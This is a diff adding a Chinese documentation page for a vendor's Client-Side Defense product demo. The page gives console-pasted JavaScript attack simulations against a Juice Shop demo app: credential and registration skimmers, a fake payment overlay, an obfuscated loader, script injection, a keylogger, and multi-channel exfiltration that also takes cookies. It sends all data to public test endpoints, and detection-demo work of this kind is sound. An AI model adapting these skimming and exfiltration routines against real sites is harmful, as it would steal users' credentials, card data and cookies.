@@ -1,0 +1,636 @@
+---
+title: 攻擊腳本庫
+description: 預製攻擊腳本庫和 CSD 測試的自訂腳本編寫
+sidebar:
+  order: 9
+  label: 攻擊腳本庫
+i18n:
+  sourceHash: f8819580d207
+  translator: machine
+---
+
+import { Aside, Code } from "@astrojs/starlight/components";
+import Screenshot from "@f5xc-salesdemos/docs-theme/components/Screenshot.astro";
+
+本頁面提供按類別組織的攻擊模擬腳本庫。每個腳本是一個自執行函數（IIFE），設計用於貼入示範應用程式的瀏覽器 DevTools 主控台。在客戶示範期間使用這些腳本來練習特定的 CSD 偵測功能。
+
+<Aside type="caution">
+這些腳本僅用於**授權的前期生產驗證**。所有資料外洩目標都是安全的公開端點（`www.httpbin.org`、`jsonplaceholder.typicode.com`）。所有注入的腳本都會從公開 CDN 加載無害的程式庫。
+</Aside>
+
+## 安全規則
+
+此庫中的所有腳本遵循這些慣例：
+
+- **IIFE 格式** — 自執行，在 DevTools 主控台中貼上並運行
+- **安全的資料外洩目標** — `www.httpbin.org`、`jsonplaceholder.typicode.com`
+- **安全的腳本來源** — `cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io`（加載無害的程式庫）
+- **所有 fetch 呼叫中的 `mode: 'no-cors'`**
+- **`var` 宣告**用於主控台相容性
+- **主控台輸出**前綴為 `[CSD Demo]` 和類別標籤
+- **無實際惡意載荷**
+
+---
+
+## 1. 表單竊取及認證憑據收集
+
+### 登入頁面認證竊取程式
+
+**目標頁面：** `/#/login` — 運行前輸入虛擬認證
+
+**CSD 訊號：** 表單欄位讀取（電子郵件、密碼）、網路（fetch 至外部網域）
+
+export const loginSkimmer = `// CSD Demo — Login Credential Skimmer
+(function() {
+    console.log('[CSD Demo][Formjack] Starting login credential skimmer...');
+
+    // Read existing form fields (CSD detects field reads on page-load DOM fields)
+    var inputs = document.querySelectorAll('input');
+    var creds = {};
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        creds[name] = input.value || '(empty)';
+    });
+    console.log('[CSD Demo][Formjack] Harvested credentials:', creds);
+
+    // Exfiltrate via fetch
+    var payload = JSON.stringify({ type: 'login_harvest', data: creds, timestamp: Date.now() });
+    fetch('https://www.httpbin.org/post', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: payload
+    }).then(function() {
+        console.log('[CSD Demo][Formjack] Credentials exfiltrated to www.httpbin.org');
+    });
+
+    console.log('[CSD Demo][Formjack] Simulation complete.');
+})();`;
+
+<Code code={loginSkimmer} lang="js" title="登入認證竊取程式" />
+
+**在 CSD 主控台中驗證：**
+- **腳本清單** — 應用程式腳本（例如 `main.js`）因讀取電子郵件和密碼欄位而被標記為高風險
+- **表單欄位** — 電子郵件和密碼顯示為敏感（由系統標記）
+
+### 註冊頁面收集程式
+
+**目標頁面：** `/#/register` — 運行前填入所有欄位
+
+**CSD 訊號：** 表單欄位讀取（電子郵件、密碼、安全問題）
+
+export const regHarvester = `// CSD Demo — Registration Page Harvester
+(function() {
+    console.log('[CSD Demo][Formjack] Starting registration harvester...');
+
+    var inputs = document.querySelectorAll('input, select');
+    var data = {};
+    inputs.forEach(function(el) {
+        var name = el.name || el.id || el.type || el.tagName;
+        data[name] = el.value || '(empty)';
+    });
+    console.log('[CSD Demo][Formjack] Registration data harvested:', data);
+
+    var payload = JSON.stringify({ type: 'registration_harvest', data: data, timestamp: Date.now() });
+    fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload
+    }).then(function() {
+        console.log('[CSD Demo][Formjack] Registration data exfiltrated to jsonplaceholder.typicode.com');
+    });
+
+    console.log('[CSD Demo][Formjack] Simulation complete.');
+})();`;
+
+<Code code={regHarvester} lang="js" title="註冊頁面收集程式" />
+
+**在 CSD 主控台中驗證：**
+- **表單欄位** — 註冊欄位出現並帶有敏感度分類
+- **腳本清單** — 讀取註冊欄位的腳本被標記供審查
+
+---
+
+## 2. 數位竊取
+
+### 支付頁面卡片竊取程式
+
+**目標頁面：** `/#/login`（Juice Shop 結帳需要身份驗證 — 使用登入頁面演示覆蓋層技術）
+
+**CSD 訊號：** 腳本注入（覆蓋層表單）、表單欄位讀取（原始欄位）
+
+export const cardSkimmer = `// CSD Demo — Payment Card Skimmer (Overlay Technique)
+(function() {
+    console.log('[CSD Demo][Skim] Starting payment card skimmer simulation...');
+
+    // Step 1: Read existing form fields first
+    var inputs = document.querySelectorAll('input');
+    var existing = {};
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        existing[name] = input.value || '(empty)';
+    });
+    console.log('[CSD Demo][Skim] Existing fields harvested:', existing);
+
+    // Step 2: Inject a fake overlay form (CSD detects the script injection)
+    var overlay = document.createElement('div');
+    overlay.id = 'csd-demo-overlay';
+    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:99999;display:flex;align-items:center;justify-content:center;';
+    overlay.innerHTML = '<div style="background:white;padding:30px;border-radius:8px;max-width:400px;width:100%;">' +
+        '<h3 style="margin:0 0 15px;color:#333;">Payment Verification Required</h3>' +
+        '<p style="color:#666;font-size:14px;">Session expired. Re-enter payment details.</p>' +
+        '<div style="margin:10px 0;padding:8px;border:1px solid #ccc;border-radius:4px;color:#999;">4111-XXXX-XXXX-1111</div>' +
+        '<div style="margin:10px 0;padding:8px;border:1px solid #ccc;border-radius:4px;color:#999;">CVV: ***</div>' +
+        '<div style="text-align:right;margin-top:15px;">' +
+        '<button onclick="document.getElementById(\\'csd-demo-overlay\\').remove();console.log(\\'[CSD Demo][Skim] Overlay dismissed\\');" style="padding:8px 20px;background:#4CAF50;color:white;border:none;border-radius:4px;cursor:pointer;">Verify</button></div></div>';
+    document.body.appendChild(overlay);
+    console.log('[CSD Demo][Skim] Fake payment overlay injected into DOM');
+
+    // Step 3: Exfiltrate captured data
+    var payload = JSON.stringify({ type: 'card_skim', captured: existing, timestamp: Date.now() });
+    fetch('https://www.httpbin.org/post', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: payload
+    }).then(function() {
+        console.log('[CSD Demo][Skim] Skimmed data exfiltrated to www.httpbin.org');
+    });
+
+    console.log('[CSD Demo][Skim] Simulation complete. Click "Verify" on the overlay to dismiss it.');
+})();`;
+
+<Code code={cardSkimmer} lang="js" title="支付卡片竊取程式（覆蓋層）" />
+
+<Screenshot light="/images/attack-overlay-card.png" dark="/images/attack-overlay-card.png" alt="卡片竊取程式注入的支付覆蓋層" />
+
+**在 CSD 主控台中驗證：**
+- **腳本清單** — 因 DOM 操作和欄位讀取而被標記的腳本
+- **表單欄位** — 原始頁面欄位顯示讀取活動
+
+### 多階段混淆載入程式
+
+**目標頁面：** 示範網站上的任何頁面
+
+**CSD 訊號：** 腳本注入（解碼載荷建立新的腳本標籤）
+
+export const obfuscatedLoader = `// CSD Demo — Multi-Stage Obfuscated Loader
+(function() {
+    console.log('[CSD Demo][Skim] Starting obfuscated loader simulation...');
+
+    // Stage 1: Base64-encoded script URL (simulates obfuscation)
+    var encoded = btoa('https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js');
+    console.log('[CSD Demo][Skim] Stage 1: Encoded payload:', encoded);
+
+    // Stage 2: Decode and inject
+    var decoded = atob(encoded);
+    console.log('[CSD Demo][Skim] Stage 2: Decoded URL:', decoded);
+
+    var script = document.createElement('script');
+    script.src = decoded;
+    script.onload = function() {
+        console.log('[CSD Demo][Skim] Stage 3: Decoded script loaded successfully from', decoded);
+    };
+    script.onerror = function() {
+        console.log('[CSD Demo][Skim] Stage 3: Script load attempted (may be blocked by CSP)');
+    };
+    document.head.appendChild(script);
+
+    console.log('[CSD Demo][Skim] Simulation complete. CSD detects the injected script tag regardless of encoding.');
+})();`;
+
+<Code code={obfuscatedLoader} lang="js" title="多階段混淆載入程式" />
+
+**在 CSD 主控台中驗證：**
+- **腳本清單** — `cdn.jsdelivr.net` 腳本顯示為新項目
+- **網路** — `cdn.jsdelivr.net` 網域列出
+
+---
+
+## 3. 供應鏈及腳本注入
+
+### 多 CDN 注入
+
+**目標頁面：** 示範網站上的任何頁面
+
+**CSD 訊號：** 腳本注入（4 個新的第三方腳本標籤）、網路（4 個新的網域）
+
+export const multiCdn = `// CSD Demo — Multi-CDN Script Injection
+(function() {
+    console.log('[CSD Demo][Supply Chain] Starting multi-CDN injection...');
+
+    var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
+    ];
+
+    cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.type = 'module';
+        script.onload = function() {
+            console.log('[CSD Demo][Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url);
+        };
+        script.onerror = function() {
+            console.log('[CSD Demo][Supply Chain] Load attempted from ' + cdn.name + ' (may be blocked)');
+        };
+        document.head.appendChild(script);
+        console.log('[CSD Demo][Supply Chain] Injected script tag: ' + cdn.name);
+    });
+
+    console.log('[CSD Demo][Supply Chain] 4 third-party scripts injected. CSD will detect all 4 new domains.');
+})();`;
+
+<Code code={multiCdn} lang="js" title="多 CDN 腳本注入" />
+
+**在 CSD 主控台中驗證：**
+- **腳本清單** — 來自 `cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io` 的 4 個新腳本項目
+- **網路** — 所有 4 個 CDN 網域出現在所有網域清單中
+
+### 標籤管理工具劫持模擬
+
+**目標頁面：** 示範網站上的任何頁面
+
+**CSD 訊號：** 腳本注入（虛假的分析/標籤管理工具腳本）
+
+export const tagManagerHijack = `// CSD Demo — Tag Manager Hijack
+(function() {
+    console.log('[CSD Demo][Supply Chain] Starting tag manager hijack simulation...');
+
+    // Simulate a compromised tag manager loading a malicious analytics script
+    var fakeTag = document.createElement('script');
+    fakeTag.src = 'https://cdn.jsdelivr.net/npm/chart.js@4.4.7/dist/chart.umd.min.js';
+    fakeTag.setAttribute('data-tag-manager', 'hijacked');
+    fakeTag.onload = function() {
+        console.log('[CSD Demo][Supply Chain] Fake analytics script loaded via tag manager hijack');
+
+        // After loading, read form fields (simulating data collection by compromised tag)
+        var inputs = document.querySelectorAll('input');
+        var collected = {};
+        inputs.forEach(function(input) {
+            var name = input.name || input.id || input.type;
+            collected[name] = input.value || '(empty)';
+        });
+        console.log('[CSD Demo][Supply Chain] Compromised tag collected form data:', collected);
+    };
+    fakeTag.onerror = function() {
+        console.log('[CSD Demo][Supply Chain] Script load attempted (may be blocked)');
+    };
+    document.head.appendChild(fakeTag);
+
+    console.log('[CSD Demo][Supply Chain] Tag manager hijack simulation complete.');
+})();`;
+
+<Code code={tagManagerHijack} lang="js" title="標籤管理工具劫持" />
+
+**在 CSD 主控台中驗證：**
+- **腳本清單** — 來自 `cdn.jsdelivr.net` 的新腳本，具有 `chart.js` 路徑
+- **表單欄位** — 如果在帶有表單的頁面上運行，欄位讀取活動會增加
+
+---
+
+## 4. 資料外洩通道
+
+### 多通道資料外洩
+
+**目標頁面：** `/#/login` — 運行前輸入虛擬認證
+
+**CSD 訊號：** 表單欄位讀取、網路（fetch 來源網域）
+
+export const multiChannel = `// CSD Demo — Multi-Channel Exfiltration
+(function() {
+    console.log('[CSD Demo][Exfil] Starting multi-channel exfiltration...');
+
+    // Harvest form fields
+    var inputs = document.querySelectorAll('input');
+    var data = {};
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        data[name] = input.value || '(empty)';
+    });
+    console.log('[CSD Demo][Exfil] Data harvested:', data);
+    var payload = JSON.stringify({ type: 'multi_channel', data: data, timestamp: Date.now() });
+
+    // Channel 1: Fetch POST
+    fetch('https://www.httpbin.org/post', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: payload
+    }).then(function() {
+        console.log('[CSD Demo][Exfil] Channel 1 (fetch POST) sent to www.httpbin.org');
+    });
+
+    // Channel 2: Image beacon
+    var img = new Image();
+    img.src = 'https://www.httpbin.org/get?data=' + encodeURIComponent(payload).substring(0, 200);
+    img.onload = function() { console.log('[CSD Demo][Exfil] Channel 2 (image beacon) sent to www.httpbin.org'); };
+    img.onerror = function() { console.log('[CSD Demo][Exfil] Channel 2 (image beacon) attempted'); };
+    console.log('[CSD Demo][Exfil] Channel 2 (image beacon) initiated');
+
+    // Channel 3: Link prefetch
+    var link = document.createElement('link');
+    link.rel = 'prefetch';
+    link.href = 'https://jsonplaceholder.typicode.com/posts?exfil=' + encodeURIComponent(payload).substring(0, 200);
+    document.head.appendChild(link);
+    console.log('[CSD Demo][Exfil] Channel 3 (link prefetch) injected');
+
+    console.log('[CSD Demo][Exfil] 3 exfil channels attempted. Note: CSD Network view tracks script source domains, not fetch/beacon destinations.');
+})();`;
+
+<Code code={multiChannel} lang="js" title="多通道資料外洩" />
+
+<Aside type="note">
+外洩目標（`www.httpbin.org`、`jsonplaceholder.typicode.com`）**不會**出現在 CSD 網路檢視中 — 只有腳本載入來源網域會顯示。這裡的主要偵測訊號是**表單欄位讀取**。如需詳細資訊，請參閱[偵測邊界](/csd/overview/#detection-boundaries)。
+</Aside>
+
+**在 CSD 主控台中驗證：**
+- **表單欄位** — 電子郵件和密碼欄位顯示讀取活動
+- **腳本清單** — 應用程式腳本因欄位讀取而被標記
+
+### 大量網域資料外洩
+
+**目標頁面：** `/#/login` — 運行前輸入虛擬認證
+
+**CSD 訊號：** 表單欄位讀取、腳本注入（來自多個網域的腳本標籤）
+
+export const highVolume = `// CSD Demo — High-Volume Domain Exfiltration
+(function() {
+    console.log('[CSD Demo][Exfil] Starting high-volume exfiltration simulation...');
+
+    // Harvest form data
+    var inputs = document.querySelectorAll('input');
+    var data = {};
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        data[name] = input.value || '(empty)';
+    });
+    console.log('[CSD Demo][Exfil] Data harvested:', data);
+
+    // Inject scripts from multiple CDN domains (these WILL appear in CSD Network view)
+    var sources = [
+        'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js',
+        'https://esm.sh/moment@2.30.1',
+        'https://unpkg.com/underscore@1.13.7/underscore-min.js',
+        'https://cdn.jsdelivr.net/npm/chart.js@4.4.7/dist/chart.umd.min.js',
+        'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js'
+    ];
+
+    sources.forEach(function(src, i) {
+        var script = document.createElement('script');
+        script.src = src;
+        script.type = 'module';
+        script.onload = function() {
+            console.log('[CSD Demo][Exfil] Script ' + (i + 1) + '/' + sources.length + ' loaded: ' + src);
+        };
+        script.onerror = function() {
+            console.log('[CSD Demo][Exfil] Script ' + (i + 1) + ' load attempted');
+        };
+        document.head.appendChild(script);
+    });
+
+    // Also send via fetch to safe endpoints
+    var payload = JSON.stringify({ type: 'high_volume', data: data, timestamp: Date.now() });
+    fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload });
+    fetch('https://jsonplaceholder.typicode.com/posts', { method: 'POST', mode: 'no-cors', body: payload });
+
+    console.log('[CSD Demo][Exfil] ' + sources.length + ' script injections + 2 fetch channels. Script domains will appear in CSD Network view.');
+})();`;
+
+<Code code={highVolume} lang="js" title="大量網域資料外洩" />
+
+**在 CSD 主控台中驗證：**
+- **腳本清單** — 5 個新的第三方腳本項目
+- **網路** — `cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io` 網域列出
+- **表單欄位** — 登入欄位顯示讀取活動
+
+---
+
+## 5. DOM 操作及覆蓋層
+
+### 表單覆蓋層攻擊
+
+**目標頁面：** `/#/login`
+
+**CSD 訊號：** 表單欄位讀取（在覆蓋層之前讀取原始欄位）
+
+export const formOverlay = `// CSD Demo — Form Overlay Attack
+(function() {
+    console.log('[CSD Demo][DOM] Starting form overlay attack...');
+
+    // Read the real form fields first
+    var inputs = document.querySelectorAll('input');
+    var realData = {};
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        realData[name] = input.value || '(empty)';
+    });
+    console.log('[CSD Demo][DOM] Real form data captured:', realData);
+
+    // Find the form container and overlay it
+    var form = document.querySelector('form') || document.querySelector('[class*="login"]') || document.querySelector('mat-card');
+    if (form) {
+        var rect = form.getBoundingClientRect();
+        var overlay = document.createElement('div');
+        overlay.id = 'csd-demo-form-overlay';
+        overlay.style.cssText = 'position:fixed;top:' + rect.top + 'px;left:' + rect.left + 'px;width:' + rect.width + 'px;height:' + rect.height + 'px;background:white;z-index:99999;display:flex;flex-direction:column;justify-content:center;padding:20px;box-sizing:border-box;border:2px solid #e0e0e0;border-radius:8px;';
+        overlay.innerHTML = '<h4 style="margin:0 0 10px;color:#333;">Sign In</h4>' +
+            '<input type="email" placeholder="Email" style="margin:5px 0;padding:8px;border:1px solid #ccc;border-radius:4px;" />' +
+            '<input type="password" placeholder="Password" style="margin:5px 0;padding:8px;border:1px solid #ccc;border-radius:4px;" />' +
+            '<button onclick="document.getElementById(\\'csd-demo-form-overlay\\').remove();console.log(\\'[CSD Demo][DOM] Overlay dismissed\\');" style="margin-top:10px;padding:8px;background:#1976d2;color:white;border:none;border-radius:4px;cursor:pointer;">Log in</button>';
+        document.body.appendChild(overlay);
+        console.log('[CSD Demo][DOM] Transparent overlay form placed over real login form');
+    } else {
+        console.log('[CSD Demo][DOM] No form container found — overlay skipped');
+    }
+
+    console.log('[CSD Demo][DOM] Simulation complete. The overlay captures input instead of the real form.');
+})();`;
+
+<Code code={formOverlay} lang="js" title="表單覆蓋層攻擊" />
+
+<Screenshot light="/images/attack-overlay-form.png" dark="/images/attack-overlay-form.png" alt="虛假登入表單覆蓋實際表單" />
+
+<Aside type="note">
+CSD **不會**追蹤動態建立的表單欄位。覆蓋層的注入 `input` 元素**不會**出現在 CSD 表單欄位檢視中。CSD 通過在放置覆蓋層之前發生的**原始欄位讀取**來偵測此攻擊。
+</Aside>
+
+**在 CSD 主控台中驗證：**
+- **表單欄位** — 原始電子郵件和密碼欄位顯示讀取活動
+- **腳本清單** — 因欄位存取而被標記的腳本
+
+### 鍵盤記錄程式模擬
+
+**目標頁面：** `/#/login`
+
+**CSD 訊號：** 表單欄位讀取（存取輸入元素以附加偵聽器）
+
+export const keylogger = `// CSD Demo — Keylogger Simulation
+(function() {
+    console.log('[CSD Demo][DOM] Starting keylogger simulation...');
+
+    var keyBuffer = [];
+    var flushInterval = 5000;
+
+    // Attach keydown listener to capture keystrokes
+    document.addEventListener('keydown', function(e) {
+        keyBuffer.push({
+            key: e.key,
+            target: (e.target.name || e.target.id || e.target.tagName),
+            timestamp: Date.now()
+        });
+        if (keyBuffer.length >= 10) {
+            console.log('[CSD Demo][DOM] Keylogger buffer (last 10 keys):', JSON.parse(JSON.stringify(keyBuffer.slice(-10))));
+        }
+    });
+    console.log('[CSD Demo][DOM] Keydown listener attached to document');
+
+    // Also read current form field values
+    var inputs = document.querySelectorAll('input');
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        console.log('[CSD Demo][DOM] Monitoring field: ' + name + ' (current value: ' + (input.value || '(empty)') + ')');
+    });
+
+    // Periodic flush simulation
+    var flushCount = 0;
+    var interval = setInterval(function() {
+        flushCount++;
+        if (keyBuffer.length > 0) {
+            console.log('[CSD Demo][DOM] Keylogger flush #' + flushCount + ':', keyBuffer.length, 'keystrokes captured');
+            fetch('https://www.httpbin.org/post', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({ type: 'keylog', keys: keyBuffer, timestamp: Date.now() })
+            });
+            keyBuffer = [];
+        }
+        if (flushCount >= 6) {
+            clearInterval(interval);
+            console.log('[CSD Demo][DOM] Keylogger simulation ended (30s max duration)');
+        }
+    }, flushInterval);
+
+    console.log('[CSD Demo][DOM] Keylogger active for 30 seconds. Type in form fields to see captured output.');
+})();`;
+
+<Code code={keylogger} lang="js" title="鍵盤記錄程式模擬" />
+
+**在 CSD 主控台中驗證：**
+- **表單欄位** — 輸入欄位顯示來自監控腳本的讀取活動
+- **腳本清單** — 因存取表單欄位值而被標記的腳本
+
+---
+
+## 6. 綜合壓力測試
+
+### 最大偵測腳本
+
+此腳本將所有攻擊向量組合成單一 IIFE — "最終演示"腳本。當您想在一次執行中觸發每個 CSD 偵測訊號時，請運行此腳本。
+
+**目標頁面：** `/#/login` — 運行前輸入虛擬認證
+
+**CSD 訊號：** 表單欄位讀取、腳本注入（4 個 CDN 網域）、網路（4 個新的網域）
+
+export const maxDetection = `// CSD Demo — Maximum Detection (Combined Stress Test)
+(function() {
+    console.log('='.repeat(60));
+    console.log('[CSD Demo] MAXIMUM DETECTION — Combined Stress Test');
+    console.log('='.repeat(60));
+
+    // Phase 1: Form Field Harvesting
+    console.log('\\n--- Phase 1: Form Field Harvesting ---');
+    var inputs = document.querySelectorAll('input');
+    var harvested = {};
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        harvested[name] = input.value || '(empty)';
+    });
+    console.log('[CSD Demo][Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+
+    // Phase 2: Multi-CDN Script Injection
+    console.log('\\n--- Phase 2: Supply Chain — Multi-CDN Injection ---');
+    var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr (lodash)' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh (moment)' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg (underscore)' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm (dayjs)' }
+    ];
+    cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.type = 'module';
+        script.onload = function() {
+            console.log('[CSD Demo][Supply Chain] Loaded: ' + cdn.name);
+        };
+        script.onerror = function() {
+            console.log('[CSD Demo][Supply Chain] Load attempted: ' + cdn.name);
+        };
+        document.head.appendChild(script);
+        console.log('[CSD Demo][Supply Chain] Injected: ' + cdn.name);
+    });
+
+    // Phase 3: Data Exfiltration (multiple channels)
+    console.log('\\n--- Phase 3: Data Exfiltration ---');
+    var payload = JSON.stringify({
+        type: 'max_detection',
+        credentials: harvested,
+        page: window.location.href,
+        cookies: document.cookie,
+        timestamp: Date.now()
+    });
+
+    // Fetch POST
+    fetch('https://www.httpbin.org/post', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: payload
+    }).then(function() {
+        console.log('[CSD Demo][Exfil] Fetch POST sent to www.httpbin.org');
+    });
+
+    // Fetch POST (second endpoint)
+    fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload
+    }).then(function() {
+        console.log('[CSD Demo][Exfil] Fetch POST sent to jsonplaceholder.typicode.com');
+    });
+
+    // Image beacon
+    var img = new Image();
+    img.src = 'https://www.httpbin.org/get?beacon=' + encodeURIComponent(payload).substring(0, 200);
+    console.log('[CSD Demo][Exfil] Image beacon sent to www.httpbin.org');
+
+    // Phase 4: DOM Manipulation
+    console.log('\\n--- Phase 4: DOM Manipulation ---');
+    var banner = document.createElement('div');
+    banner.id = 'csd-demo-banner';
+    banner.style.cssText = 'position:fixed;top:0;left:0;width:100%;padding:12px;background:#d32f2f;color:white;text-align:center;z-index:99999;font-family:sans-serif;font-size:14px;';
+    banner.innerHTML = 'CSD Demo: Attack simulation active — ' + cdns.length + ' scripts injected, ' + Object.keys(harvested).length + ' fields harvested ' +
+        '<button onclick="document.getElementById(\\'csd-demo-banner\\').remove();" style="margin-left:15px;padding:4px 12px;background:white;color:#d32f2f;border:none;border-radius:3px;cursor:pointer;">Dismiss</button>';
+    document.body.appendChild(banner);
+    console.log('[CSD Demo][DOM] Attack status banner injected');
+
+    // Summary
+    console.log('\\n' + '='.repeat(60));
+    console.log('[CSD Demo] SIMULATION COMPLETE');
+    console.log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+    console.log('[CSD Demo] Scripts injected: ' + cdns.length + ' (from ' + cdns.length + ' CDN domains)');
+    console.log('[CSD Demo] Exfil channels: 3 (2x fetch + 1x image beacon)');
+    console.log('[CSD Demo] Detection takes 5-10 minutes to appear in CSD console.');
+    console.log('='.repeat(60));
+})();`;
+
+<Code code={maxDetection} lang="js" title="最大偵測 — 綜合壓力測試" />
+
+<Screenshot light="/images/attack-stress-test-output-light.png" dark="/images/attack-stress-test-output-dark.png" alt="最大偵測腳本的主控台輸出" />
+
+**在 CSD 主控台中驗證（5-10 分鐘後）：**
+- **儀表板** — 已消費交易計數器增加
+- **腳本清單** — 應用程式腳本被標記為高風險；4 個新的第三方腳本來自 CDN 網域
+- **表單欄位** — 電子郵件和密碼分類為敏感（由系統標記），有讀取活動
+- **網路** — `cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io` 出現在所有網域中
+- **受影響的使用者** — 您的會話出現，具有 IP、地理位置、瀏覽器、設備資訊
